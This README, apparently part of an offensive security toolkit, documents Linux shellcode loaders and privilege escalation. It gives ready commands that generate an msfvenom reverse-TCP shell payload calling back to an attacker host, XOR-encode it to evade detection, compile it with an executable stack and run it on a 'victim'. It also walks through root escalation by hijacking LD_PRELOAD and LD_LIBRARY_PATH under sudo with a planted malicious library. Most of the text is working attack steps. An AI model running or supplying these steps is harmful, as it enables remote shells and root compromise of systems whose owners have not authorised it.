# linux loaders

Four files covering two use cases: a shellcode runner and two privilege escalation techniques. This is an identical set to `03-loaders/linux/` — same files, same documentation applies.

---

## File Roles

| File | Chain or Standalone? | Role | Runs on |
|------|---------------------|------|---------|
| `simpleXORencoder.c` | Chain — Step 1 (skippable) | Encode raw shellcode → print hex | Kali (prep tool) |
| `simpleLoader.c` | Chain — Step 2 | Runtime decoder + executor | Linux victim |
| `sharedLibrary_LD_PRELOAD.c` | Standalone | Priv esc via LD_PRELOAD hook | Linux victim |
| `sharedLibrary_LD_LIBRARY_PATH.c` | Standalone | Priv esc via LD_LIBRARY_PATH hijack | Linux victim |

---

## Chain: Shellcode Runner

```
simpleXORencoder.c   →   simpleLoader.c
(optional)               (the actual payload)
```

Skip the encoder — use Python instead:
```bash
# Generate shellcode
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -f raw -o shell.bin

# XOR encode with key 0xfa
python3 -c "
data = open('shell.bin','rb').read()
enc  = bytes(b ^ 0xfa for b in data)
print(''.join(f'\\\\x{b:02x}' for b in enc))
"
# Paste \xNN output into buf[] in simpleLoader.c

# Compile with executable stack
gcc -z execstack -o loader simpleLoader.c

# Run on target
./loader
```

---

## Standalone: LD_PRELOAD Privilege Escalation

**Requirement:** `sudo -l` shows `env_keep+=LD_PRELOAD` and you have a whitelisted sudo command.

```bash
# Paste shellcode into buf[], compile
gcc -fPIC -shared -nostartfiles -o /tmp/evil.so sharedLibrary_LD_PRELOAD.c

# Trigger — shellcode fires when the sudo'd program calls geteuid()
sudo LD_PRELOAD=/tmp/evil.so <ANY_WHITELISTED_SUDO_COMMAND>
```

---

## Standalone: LD_LIBRARY_PATH Privilege Escalation

**Requirement:** `sudo` preserves `LD_LIBRARY_PATH` AND you can identify + replace a library the target binary loads.

```bash
# Find which library to impersonate
ldd $(which <SUDO_ALLOWED_BINARY>)
# Pick one, e.g. libgpg-error.so.0

# Paste shellcode into buf[], compile with the exact library name
gcc -fPIC -shared -nostartfiles -o /tmp/libgpg-error.so.0 sharedLibrary_LD_LIBRARY_PATH.c

# Trigger — payload fires automatically when the library loads (before main())
sudo LD_LIBRARY_PATH=/tmp <WHITELISTED_SUDO_COMMAND>
```

---

## Notes

- Both shared library techniques fire the payload without needing `geteuid()` or any specific function call — `LD_PRELOAD` hooks `geteuid()` specifically, while `LD_LIBRARY_PATH` uses a constructor that fires on load.
- The XOR key in `simpleLoader.c` is `0xfa` — the encode and decode keys must match.
- See `08-linux/RUNBOOK.md` for the full privilege escalation decision tree.
